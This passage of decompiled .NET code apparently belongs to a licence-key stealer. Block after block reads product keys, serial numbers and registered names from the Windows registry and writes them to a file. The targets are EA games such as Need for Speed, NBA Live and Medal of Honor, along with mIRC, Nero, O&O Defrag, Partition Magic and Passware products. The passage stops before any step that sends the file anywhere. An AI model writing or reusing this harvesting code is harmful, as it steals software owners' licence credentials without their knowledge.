					IL_2d2c:
					num = 689;
					streamWriter.WriteLine("");
					goto IL_2d3f;
					IL_2d3f:
					num = 690;
					value99 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Medal of Honor Airborne", "Product GUID", null));
					goto IL_2d5d;
					IL_2d5d:
					num = 691;
					streamWriter.WriteLine(value99);
					goto IL_2d6d;
					IL_2d6d:
					num = 692;
					streamWriter.Flush();
					goto IL_2d7b;
					IL_2d7b:
					num = 693;
					streamWriter.WriteLine("");
					goto IL_2d8e;
					IL_2d8e:
					num = 694;
					streamWriter.Flush();
					goto IL_2d9c;
					IL_2d9c:
					ProjectData.ClearProjectError();
					num3 = -101;
					goto IL_2da5;
					IL_2da5:
					num = 696;
					streamWriter.WriteLine("Medal of Honor: Airborne");
					goto IL_2db8;
					IL_2db8:
					num = 697;
					value100 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault", "ergc", null));
					goto IL_2dd6;
					IL_2dd6:
					num = 698;
					streamWriter.WriteLine(value100);
					goto IL_2de6;
					IL_2de6:
					num = 699;
					streamWriter.Flush();
					goto IL_2df4;
					IL_2df4:
					num = 700;
					streamWriter.WriteLine("");
					goto IL_2e07;
					IL_2e07:
					num = 701;
					streamWriter.Flush();
					goto IL_2e15;
					IL_2e15:
					ProjectData.ClearProjectError();
					num3 = -102;
					goto IL_2e1e;
					IL_2e1e:
					num = 703;
					streamWriter.WriteLine("Medal of Honor: Allied Assault");
					goto IL_2e31;
					IL_2e31:
					num = 704;
					value101 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough", "ergc", null));
					goto IL_2e4f;
					IL_2e4f:
					num = 705;
					streamWriter.WriteLine(value101);
					goto IL_2e5f;
					IL_2e5f:
					num = 706;
					streamWriter.Flush();
					goto IL_2e6d;
					IL_2e6d:
					num = 707;
					streamWriter.WriteLine("");
					goto IL_2e80;
					IL_2e80:
					num = 708;
					streamWriter.Flush();
					goto IL_2e8e;
					IL_2e8e:
					ProjectData.ClearProjectError();
					num3 = -103;
					goto IL_2e97;
					IL_2e97:
					num = 710;
					streamWriter.WriteLine("Medal of Honor: Allied Assault: Breakthrough");
					goto IL_2eaa;
					IL_2eaa:
					num = 711;
					value102 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead", "ergc", null));
					goto IL_2ec8;
					IL_2ec8:
					num = 712;
					streamWriter.WriteLine(value102);
					goto IL_2ed8;
					IL_2ed8:
					num = 713;
					streamWriter.Flush();
					goto IL_2ee6;
					IL_2ee6:
					num = 714;
					streamWriter.WriteLine("");
					goto IL_2ef9;
					IL_2ef9:
					num = 715;
					streamWriter.Flush();
					goto IL_2f07;
					IL_2f07:
					ProjectData.ClearProjectError();
					num3 = -104;
					goto IL_2f10;
					IL_2f10:
					num = 717;
					streamWriter.WriteLine("Medal of Honor: Allied Assault: Spearhead");
					goto IL_2f23;
					IL_2f23:
					num = 718;
					value103 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Medal of Honor: Heroes 2", "ergc", null));
					goto IL_2f41;
					IL_2f41:
					num = 719;
					streamWriter.WriteLine(value103);
					goto IL_2f51;
					IL_2f51:
					num = 720;
					streamWriter.Flush();
					goto IL_2f5f;
					IL_2f5f:
					num = 721;
					streamWriter.WriteLine("");
					goto IL_2f72;
					IL_2f72:
					num = 722;
					streamWriter.Flush();
					goto IL_2f80;
					IL_2f80:
					ProjectData.ClearProjectError();
					num3 = -105;
					goto IL_2f89;
					IL_2f89:
					num = 724;
					streamWriter.WriteLine("Medal of Honor: Heroes 2");
					goto IL_2f9c;
					IL_2f9c:
					num = 725;
					value104 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "UserName", null));
					goto IL_2fba;
					IL_2fba:
					num = 726;
					streamWriter.WriteLine(value104);
					goto IL_2fca;
					IL_2fca:
					num = 727;
					streamWriter.Flush();
					goto IL_2fd8;
					IL_2fd8:
					num = 728;
					streamWriter.WriteLine("");
					goto IL_2feb;
					IL_2feb:
					num = 729;
					streamWriter.Flush();
					goto IL_2ff9;
					IL_2ff9:
					ProjectData.ClearProjectError();
					num3 = -106;
					goto IL_3002;
					IL_3002:
					num = 731;
					streamWriter.WriteLine("mIRC");
					goto IL_3015;
					IL_3015:
					num = 732;
					value105 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "License", null));
					goto IL_3033;
					IL_3033:
					num = 733;
					streamWriter.WriteLine(value105);
					goto IL_3043;
					IL_3043:
					num = 734;
					streamWriter.Flush();
					goto IL_3051;
					IL_3051:
					num = 735;
					streamWriter.WriteLine("");
					goto IL_3064;
					IL_3064:
					num = 736;
					streamWriter.Flush();
					goto IL_3072;
					IL_3072:
					ProjectData.ClearProjectError();
					num3 = -107;
					goto IL_307b;
					IL_307b:
					num = 738;
					streamWriter.WriteLine("Nascar Racing 2002");
					goto IL_308e;
					IL_308e:
					num = 739;
					value106 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002", "ergc", null));
					goto IL_30ac;
					IL_30ac:
					num = 740;
					streamWriter.WriteLine(value106);
					goto IL_30bc;
					IL_30bc:
					num = 741;
					streamWriter.Flush();
					goto IL_30ca;
					IL_30ca:
					num = 742;
					streamWriter.WriteLine("");
					goto IL_30dd;
					IL_30dd:
					num = 743;
					streamWriter.Flush();
					goto IL_30eb;
					IL_30eb:
					ProjectData.ClearProjectError();
					num3 = -108;
					goto IL_30f4;
					IL_30f4:
					num = 745;
					streamWriter.WriteLine("Nascar Racing 2003");
					goto IL_3107;
					IL_3107:
					num = 746;
					value107 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003", "ergc", null));
					goto IL_3125;
					IL_3125:
					num = 747;
					streamWriter.WriteLine(value107);
					goto IL_3135;
					IL_3135:
					num = 748;
					streamWriter.Flush();
					goto IL_3143;
					IL_3143:
					num = 749;
					streamWriter.WriteLine("");
					goto IL_3156;
					IL_3156:
					num = 750;
					streamWriter.Flush();
					goto IL_3164;
					IL_3164:
					ProjectData.ClearProjectError();
					num3 = -109;
					goto IL_316d;
					IL_316d:
					num = 752;
					streamWriter.WriteLine("NHL 2002");
					goto IL_3180;
					IL_3180:
					num = 753;
					value108 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_319e;
					IL_319e:
					num = 754;
					streamWriter.WriteLine(value108);
					goto IL_31ae;
					IL_31ae:
					num = 755;
					streamWriter.Flush();
					goto IL_31bc;
					IL_31bc:
					num = 756;
					streamWriter.WriteLine("");
					goto IL_31cf;
					IL_31cf:
					num = 757;
					streamWriter.Flush();
					goto IL_31dd;
					IL_31dd:
					ProjectData.ClearProjectError();
					num3 = -110;
					goto IL_31e6;
					IL_31e6:
					num = 759;
					streamWriter.WriteLine("NBA LIVE 2003");
					goto IL_31f9;
					IL_31f9:
					num = 760;
					value109 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2003", "ergc", null));
					goto IL_3217;
					IL_3217:
					num = 761;
					streamWriter.WriteLine(value109);
					goto IL_3227;
					IL_3227:
					num = 762;
					streamWriter.Flush();
					goto IL_3235;
					IL_3235:
					num = 763;
					streamWriter.WriteLine("");
					goto IL_3248;
					IL_3248:
					num = 764;
					streamWriter.Flush();
					goto IL_3256;
					IL_3256:
					ProjectData.ClearProjectError();
					num3 = -111;
					goto IL_325f;
					IL_325f:
					num = 766;
					streamWriter.WriteLine("NBA LIVE 2004");
					goto IL_3272;
					IL_3272:
					num = 767;
					value110 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2004", "ergc", null));
					goto IL_3290;
					IL_3290:
					num = 768;
					streamWriter.WriteLine(value110);
					goto IL_32a0;
					IL_32a0:
					num = 769;
					streamWriter.Flush();
					goto IL_32ae;
					IL_32ae:
					num = 770;
					streamWriter.WriteLine("");
					goto IL_32c1;
					IL_32c1:
					num = 771;
					streamWriter.Flush();
					goto IL_32cf;
					IL_32cf:
					ProjectData.ClearProjectError();
					num3 = -112;
					goto IL_32d8;
					IL_32d8:
					num = 773;
					streamWriter.WriteLine("NBA LIVE 07");
					goto IL_32eb;
					IL_32eb:
					num = 774;
					value111 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 07", "ergc", null));
					goto IL_3309;
					IL_3309:
					num = 775;
					streamWriter.WriteLine(value111);
					goto IL_3319;
					IL_3319:
					num = 776;
					streamWriter.Flush();
					goto IL_3327;
					IL_3327:
					num = 777;
					streamWriter.WriteLine("");
					goto IL_333a;
					IL_333a:
					num = 778;
					streamWriter.Flush();
					goto IL_3348;
					IL_3348:
					ProjectData.ClearProjectError();
					num3 = -113;
					goto IL_3351;
					IL_3351:
					num = 780;
					streamWriter.WriteLine("NBA Live 08");
					goto IL_3364;
					IL_3364:
					num = 781;
					value112 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA Live 08", "ergc", null));
					goto IL_3382;
					IL_3382:
					num = 782;
					streamWriter.WriteLine(value112);
					goto IL_3392;
					IL_3392:
					num = 783;
					streamWriter.Flush();
					goto IL_33a0;
					IL_33a0:
					num = 784;
					streamWriter.WriteLine("");
					goto IL_33b3;
					IL_33b3:
					num = 785;
					streamWriter.Flush();
					goto IL_33c1;
					IL_33c1:
					ProjectData.ClearProjectError();
					num3 = -114;
					goto IL_33ca;
					IL_33ca:
					num = 787;
					streamWriter.WriteLine("Need for Speed Carbon");
					goto IL_33dd;
					IL_33dd:
					num = 788;
					value113 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon", "ergc", null));
					goto IL_33fb;
					IL_33fb:
					num = 789;
					streamWriter.WriteLine(value113);
					goto IL_340b;
					IL_340b:
					num = 790;
					streamWriter.Flush();
					goto IL_3419;
					IL_3419:
					num = 791;
					streamWriter.WriteLine("");
					goto IL_342c;
					IL_342c:
					num = 792;
					streamWriter.Flush();
					goto IL_343a;
					IL_343a:
					ProjectData.ClearProjectError();
					num3 = -115;
					goto IL_3443;
					IL_3443:
					num = 794;
					streamWriter.WriteLine("Need For Speed Hot Pursuit 2");
					goto IL_3456;
					IL_3456:
					num = 795;
					value114 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2", "ergc", null));
					goto IL_3474;
					IL_3474:
					num = 796;
					streamWriter.WriteLine(value114);
					goto IL_3484;
					IL_3484:
					num = 797;
					streamWriter.Flush();
					goto IL_3492;
					IL_3492:
					num = 798;
					streamWriter.WriteLine("");
					goto IL_34a5;
					IL_34a5:
					num = 799;
					streamWriter.Flush();
					goto IL_34b3;
					IL_34b3:
					ProjectData.ClearProjectError();
					num3 = -116;
					goto IL_34bc;
					IL_34bc:
					num = 801;
					streamWriter.WriteLine("Need for Speed Most Wanted");
					goto IL_34cf;
					IL_34cf:
					num = 802;
					value115 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted", "ergc", null));
					goto IL_34ed;
					IL_34ed:
					num = 803;
					streamWriter.WriteLine(value115);
					goto IL_34fd;
					IL_34fd:
					num = 804;
					streamWriter.Flush();
					goto IL_350b;
					IL_350b:
					num = 805;
					streamWriter.WriteLine("");
					goto IL_351e;
					IL_351e:
					num = 806;
					streamWriter.Flush();
					goto IL_352c;
					IL_352c:
					ProjectData.ClearProjectError();
					num3 = -117;
					goto IL_3535;
					IL_3535:
					num = 808;
					streamWriter.WriteLine("Need for Speed ProStreet");
					goto IL_3548;
					IL_3548:
					num = 809;
					value116 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet", "ergc", null));
					goto IL_3566;
					IL_3566:
					num = 810;
					streamWriter.WriteLine(value116);
					goto IL_3576;
					IL_3576:
					num = 811;
					streamWriter.Flush();
					goto IL_3584;
					IL_3584:
					num = 812;
					streamWriter.WriteLine("");
					goto IL_3597;
					IL_3597:
					num = 813;
					streamWriter.Flush();
					goto IL_35a5;
					IL_35a5:
					ProjectData.ClearProjectError();
					num3 = -118;
					goto IL_35ae;
					IL_35ae:
					num = 815;
					streamWriter.WriteLine("Need For Speed Underground");
					goto IL_35c1;
					IL_35c1:
					num = 816;
					value117 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground", "ergc", null));
					goto IL_35df;
					IL_35df:
					num = 817;
					streamWriter.WriteLine(value117);
					goto IL_35ef;
					IL_35ef:
					num = 818;
					streamWriter.Flush();
					goto IL_35fd;
					IL_35fd:
					num = 819;
					streamWriter.WriteLine("");
					goto IL_3610;
					IL_3610:
					num = 820;
					streamWriter.Flush();
					goto IL_361e;
					IL_361e:
					ProjectData.ClearProjectError();
					num3 = -119;
					goto IL_3627;
					IL_3627:
					num = 822;
					streamWriter.WriteLine("Need for Speed Underground 2");
					goto IL_363a;
					IL_363a:
					num = 823;
					value118 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2", "ergc", null));
					goto IL_3658;
					IL_3658:
					num = 824;
					streamWriter.WriteLine(value118);
					goto IL_3668;
					IL_3668:
					num = 825;
					streamWriter.Flush();
					goto IL_3676;
					IL_3676:
					num = 826;
					streamWriter.WriteLine("");
					goto IL_3689;
					IL_3689:
					num = 827;
					streamWriter.Flush();
					goto IL_3697;
					IL_3697:
					ProjectData.ClearProjectError();
					num3 = -120;
					goto IL_36a0;
					IL_36a0:
					num = 829;
					streamWriter.WriteLine("Nero - Burning Rom");
					goto IL_36b3;
					IL_36b3:
					num = 830;
					value119 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info", "Serial6", null));
					goto IL_36d1;
					IL_36d1:
					num = 831;
					streamWriter.WriteLine(value119);
					goto IL_36e1;
					IL_36e1:
					num = 832;
					streamWriter.Flush();
					goto IL_36ef;
					IL_36ef:
					num = 833;
					streamWriter.WriteLine("");
					goto IL_3702;
					IL_3702:
					num = 834;
					streamWriter.Flush();
					goto IL_3710;
					IL_3710:
					ProjectData.ClearProjectError();
					num3 = -121;
					goto IL_3719;
					IL_3719:
					num = 836;
					streamWriter.WriteLine("Nero 7");
					goto IL_372c;
					IL_372c:
					num = 837;
					value120 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nero\\Installation\\Families\\Nero 7\\Info", "Serial7_1191197813", null));
					goto IL_374a;
					IL_374a:
					num = 838;
					streamWriter.WriteLine(value120);
					goto IL_375a;
					IL_375a:
					num = 839;
					streamWriter.Flush();
					goto IL_3768;
					IL_3768:
					num = 840;
					streamWriter.WriteLine("");
					goto IL_377b;
					IL_377b:
					num = 841;
					streamWriter.Flush();
					goto IL_3789;
					IL_3789:
					ProjectData.ClearProjectError();
					num3 = -122;
					goto IL_3792;
					IL_3792:
					num = 843;
					streamWriter.WriteLine("Nero 8");
					goto IL_37a5;
					IL_37a5:
					num = 844;
					value121 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Nero\\Installation\\Families\\Nero 8\\Info", "Serial8_1194709660", null));
					goto IL_37c3;
					IL_37c3:
					num = 845;
					streamWriter.WriteLine(value121);
					goto IL_37d3;
					IL_37d3:
					num = 846;
					streamWriter.Flush();
					goto IL_37e1;
					IL_37e1:
					num = 847;
					streamWriter.WriteLine("");
					goto IL_37f4;
					IL_37f4:
					num = 848;
					streamWriter.Flush();
					goto IL_3802;
					IL_3802:
					ProjectData.ClearProjectError();
					num3 = -123;
					goto IL_380b;
					IL_380b:
					num = 850;
					streamWriter.WriteLine("NHL 2002");
					goto IL_381e;
					IL_381e:
					num = 851;
					value122 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_383c;
					IL_383c:
					num = 852;
					streamWriter.WriteLine(value122);
					goto IL_384c;
					IL_384c:
					num = 853;
					streamWriter.Flush();
					goto IL_385a;
					IL_385a:
					num = 854;
					streamWriter.WriteLine("");
					goto IL_386d;
					IL_386d:
					num = 855;
					streamWriter.Flush();
					goto IL_387b;
					IL_387b:
					ProjectData.ClearProjectError();
					num3 = -124;
					goto IL_3884;
					IL_3884:
					num = 857;
					streamWriter.WriteLine("");
					goto IL_3897;
					IL_3897:
					num = 858;
					value123 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003", "ergc", null));
					goto IL_38b5;
					IL_38b5:
					num = 859;
					streamWriter.WriteLine(value123);
					goto IL_38c5;
					IL_38c5:
					num = 860;
					streamWriter.Flush();
					goto IL_38d3;
					IL_38d3:
					num = 861;
					streamWriter.WriteLine("");
					goto IL_38e6;
					IL_38e6:
					num = 862;
					streamWriter.Flush();
					goto IL_38f4;
					IL_38f4:
					ProjectData.ClearProjectError();
					num3 = -125;
					goto IL_38fd;
					IL_38fd:
					num = 864;
					streamWriter.WriteLine("NHL 2004");
					goto IL_3910;
					IL_3910:
					num = 865;
					value124 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2004", "ergc", null));
					goto IL_392e;
					IL_392e:
					num = 866;
					streamWriter.WriteLine(value124);
					goto IL_393e;
					IL_393e:
					num = 867;
					streamWriter.Flush();
					goto IL_394c;
					IL_394c:
					num = 868;
					streamWriter.WriteLine("");
					goto IL_395f;
					IL_395f:
					num = 869;
					streamWriter.Flush();
					goto IL_396d;
					IL_396d:
					ProjectData.ClearProjectError();
					num3 = -126;
					goto IL_3976;
					IL_3976:
					num = 871;
					streamWriter.WriteLine("NHL 2005");
					goto IL_3989;
					IL_3989:
					num = 872;
					value125 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2005", "ergc", null));
					goto IL_39a7;
					IL_39a7:
					num = 873;
					streamWriter.WriteLine(value125);
					goto IL_39b7;
					IL_39b7:
					num = 874;
					streamWriter.Flush();
					goto IL_39c5;
					IL_39c5:
					num = 875;
					streamWriter.WriteLine("");
					goto IL_39d8;
					IL_39d8:
					num = 876;
					streamWriter.Flush();
					goto IL_39e6;
					IL_39e6:
					ProjectData.ClearProjectError();
					num3 = -127;
					goto IL_39ef;
					IL_39ef:
					num = 878;
					streamWriter.WriteLine("NOX");
					goto IL_3a02;
					IL_3a02:
					num = 879;
					value126 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Westwood\\Nox", "Serial", null));
					goto IL_3a20;
					IL_3a20:
					num = 880;
					streamWriter.WriteLine(value126);
					goto IL_3a30;
					IL_3a30:
					num = 881;
					streamWriter.Flush();
					goto IL_3a3e;
					IL_3a3e:
					num = 882;
					streamWriter.WriteLine("");
					goto IL_3a51;
					IL_3a51:
					num = 883;
					streamWriter.Flush();
					goto IL_3a5f;
					IL_3a5f:
					ProjectData.ClearProjectError();
					num3 = -128;
					goto IL_3a68;
					IL_3a68:
					num = 885;
					streamWriter.WriteLine("Numega SmartCheck");
					goto IL_3a7b;
					IL_3a7b:
					num = 886;
					value127 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\NuMega\\SmartCheck", "Serial", null));
					goto IL_3a99;
					IL_3a99:
					num = 887;
					streamWriter.WriteLine(value127);
					goto IL_3aa9;
					IL_3aa9:
					num = 888;
					streamWriter.Flush();
					goto IL_3ab7;
					IL_3ab7:
					num = 889;
					streamWriter.WriteLine("");
					goto IL_3aca;
					IL_3aca:
					num = 890;
					streamWriter.Flush();
					goto IL_3ad8;
					IL_3ad8:
					ProjectData.ClearProjectError();
					num3 = -129;
					goto IL_3ae4;
					IL_3ae4:
					num = 892;
					streamWriter.WriteLine("OnlineTVPlayer (Name)");
					goto IL_3af7;
					IL_3af7:
					num = 893;
					value128 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "name", null));
					goto IL_3b15;
					IL_3b15:
					num = 894;
					streamWriter.WriteLine(value128);
					goto IL_3b25;
					IL_3b25:
					num = 895;
					streamWriter.Flush();
					goto IL_3b33;
					IL_3b33:
					num = 896;
					streamWriter.WriteLine("");
					goto IL_3b46;
					IL_3b46:
					num = 897;
					streamWriter.Flush();
					goto IL_3b54;
					IL_3b54:
					ProjectData.ClearProjectError();
					num3 = -130;
					goto IL_3b60;
					IL_3b60:
					num = 899;
					streamWriter.WriteLine("OnlineTVPlayer (Serial)");
					goto IL_3b73;
					IL_3b73:
					num = 900;
					value129 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "serial", null));
					goto IL_3b91;
					IL_3b91:
					num = 901;
					streamWriter.WriteLine(value129);
					goto IL_3ba1;
					IL_3ba1:
					num = 902;
					streamWriter.Flush();
					goto IL_3baf;
					IL_3baf:
					num = 903;
					streamWriter.WriteLine("");
					goto IL_3bc2;
					IL_3bc2:
					num = 904;
					streamWriter.Flush();
					goto IL_3bd0;
					IL_3bd0:
					ProjectData.ClearProjectError();
					num3 = -131;
					goto IL_3bdc;
					IL_3bdc:
					num = 906;
					streamWriter.WriteLine("O&O Defrag 8.0 (Username)");
					goto IL_3bef;
					IL_3bef:
					num = 907;
					value130 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "User", null));
					goto IL_3c0d;
					IL_3c0d:
					num = 908;
					streamWriter.WriteLine(value130);
					goto IL_3c1d;
					IL_3c1d:
					num = 909;
					streamWriter.Flush();
					goto IL_3c2b;
					IL_3c2b:
					num = 910;
					streamWriter.WriteLine("");
					goto IL_3c3e;
					IL_3c3e:
					num = 911;
					streamWriter.Flush();
					goto IL_3c4c;
					IL_3c4c:
					ProjectData.ClearProjectError();
					num3 = -132;
					goto IL_3c58;
					IL_3c58:
					num = 913;
					streamWriter.WriteLine("O&O Defrag 8.0 (Company)");
					goto IL_3c6b;
					IL_3c6b:
					num = 914;
					value131 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "Company", null));
					goto IL_3c89;
					IL_3c89:
					num = 915;
					streamWriter.WriteLine(value131);
					goto IL_3c99;
					IL_3c99:
					num = 916;
					streamWriter.Flush();
					goto IL_3ca7;
					IL_3ca7:
					num = 917;
					streamWriter.WriteLine("");
					goto IL_3cba;
					IL_3cba:
					num = 918;
					streamWriter.Flush();
					goto IL_3cc8;
					IL_3cc8:
					ProjectData.ClearProjectError();
					num3 = -133;
					goto IL_3cd4;
					IL_3cd4:
					num = 920;
					streamWriter.WriteLine("O&O Defrag 8.0 (Serial)");
					goto IL_3ce7;
					IL_3ce7:
					num = 921;
					value132 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "SerialNo", null));
					goto IL_3d05;
					IL_3d05:
					num = 922;
					streamWriter.WriteLine(value132);
					goto IL_3d15;
					IL_3d15:
					num = 923;
					streamWriter.Flush();
					goto IL_3d23;
					IL_3d23:
					num = 924;
					streamWriter.WriteLine("");
					goto IL_3d36;
					IL_3d36:
					num = 925;
					streamWriter.Flush();
					goto IL_3d44;
					IL_3d44:
					ProjectData.ClearProjectError();
					num3 = -134;
					goto IL_3d50;
					IL_3d50:
					num = 927;
					streamWriter.WriteLine("Partition Magic 8.0");
					goto IL_3d63;
					IL_3d63:
					num = 928;
					value133 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\PowerQuest\\PartitionMagic\\8.0\\UserInfo", "SerialNumber", null));
					goto IL_3d81;
					IL_3d81:
					num = 929;
					streamWriter.WriteLine(value133);
					goto IL_3d91;
					IL_3d91:
					num = 930;
					streamWriter.Flush();
					goto IL_3d9f;
					IL_3d9f:
					num = 931;
					streamWriter.WriteLine("");
					goto IL_3db2;
					IL_3db2:
					num = 932;
					streamWriter.Flush();
					goto IL_3dc0;
					IL_3dc0:
					ProjectData.ClearProjectError();
					num3 = -135;
					goto IL_3dcc;
					IL_3dcc:
					num = 934;
					streamWriter.WriteLine("Passware Encryption Analyzer (Name)");
					goto IL_3ddf;
					IL_3ddf:
					num = 935;
					value134 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Name", null));
					goto IL_3dfd;
					IL_3dfd:
					num = 936;
					streamWriter.WriteLine(value134);
					goto IL_3e0d;
					IL_3e0d:
					num = 937;
					streamWriter.Flush();
					goto IL_3e1b;
					IL_3e1b:
					num = 938;
					streamWriter.WriteLine("");
					goto IL_3e2e;
					IL_3e2e:
					num = 939;
					streamWriter.Flush();
					goto IL_3e3c;
					IL_3e3c:
					ProjectData.ClearProjectError();
					num3 = -136;
					goto IL_3e48;
					IL_3e48:
					num = 941;
					streamWriter.WriteLine("Passware Encryption Analyzer (License)");
					goto IL_3e5b;
					IL_3e5b:
					num = 942;
					value135 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "SerialNumber", null));
					goto IL_3e79;
					IL_3e79:
					num = 943;
					streamWriter.WriteLine(value135);
					goto IL_3e89;
					IL_3e89:
					num = 944;
					streamWriter.Flush();
					goto IL_3e97;
					IL_3e97:
					num = 945;
					streamWriter.WriteLine("");
					goto IL_3eaa;
					IL_3eaa:
					num = 946;
					streamWriter.Flush();
					goto IL_3eb8;
					IL_3eb8:
					ProjectData.ClearProjectError();
					num3 = -137;
					goto IL_3ec4;
					IL_3ec4:
					num = 948;
					streamWriter.WriteLine("Passware Encryption Analyzer (Serial)");
					goto IL_3ed7;
					IL_3ed7:
					num = 949;
					value136 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Serial", null));
					goto IL_3ef5;
					IL_3ef5:
					num = 950;
					streamWriter.WriteLine(value136);
					goto IL_3f05;
					IL_3f05:
					num = 951;
					streamWriter.Flush();
					goto IL_3f13;
					IL_3f13:
					num = 952;
					streamWriter.WriteLine("");
					goto IL_3f26;
					IL_3f26:
					num = 953;
					streamWriter.Flush();
					goto IL_3f34;
					IL_3f34:
					ProjectData.ClearProjectError();
					num3 = -138;
					goto IL_3f40;
					IL_3f40:
					num = 955;
					streamWriter.WriteLine("Passware Windows Key (License)");
					goto IL_3f53;
					IL_3f53:
					num = 956;
					value137 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "License", null));
					goto IL_3f71;
					IL_3f71:
					num = 957;
					streamWriter.WriteLine(value137);
					goto IL_3f81;
					IL_3f81:
					num = 958;
					streamWriter.Flush();
					goto IL_3f8f;
					IL_3f8f:
					num = 959;
					streamWriter.WriteLine("");
					goto IL_3fa2;
					IL_3fa2:
					num = 960;
					streamWriter.Flush();
					goto IL_3fb0;
					IL_3fb0:
					ProjectData.ClearProjectError();
					num3 = -139;
					goto IL_3fbc;
					IL_3fbc:
					num = 962;
					streamWriter.WriteLine("Passware Windows Key (Name)");
					goto IL_3fcf;
					IL_3fcf:
					num = 963;
					value138 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Name", null));
					goto IL_3fed;
					IL_3fed:
					num = 964;
					streamWriter.WriteLine(value138);
					goto IL_3ffd;
					IL_3ffd:
					num = 965;
					streamWriter.Flush();
					goto IL_400b;
					IL_400b:
					num = 966;
					streamWriter.WriteLine("");
					goto IL_401e;
					IL_401e:
					num = 967;
					streamWriter.Flush();
					goto IL_402c;
					IL_402c:
					ProjectData.ClearProjectError();
					num3 = -140;
					goto IL_4038;
					IL_4038:
					num = 969;
					streamWriter.WriteLine("Passware Windows Key (Serial)");
					goto IL_404b;
					IL_404b:
					num = 970;
					value139 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Serial", null));
					goto IL_4069;
					IL_4069:
					num = 971;
					streamWriter.WriteLine(value139);
					goto IL_4079;
					IL_4079:
					num = 972;
					streamWriter.Flush();
					goto IL_4087;
					IL_4087:
					num = 973;
					streamWriter.WriteLine("");
					goto IL_409a;
					IL_409a:
					num = 974;
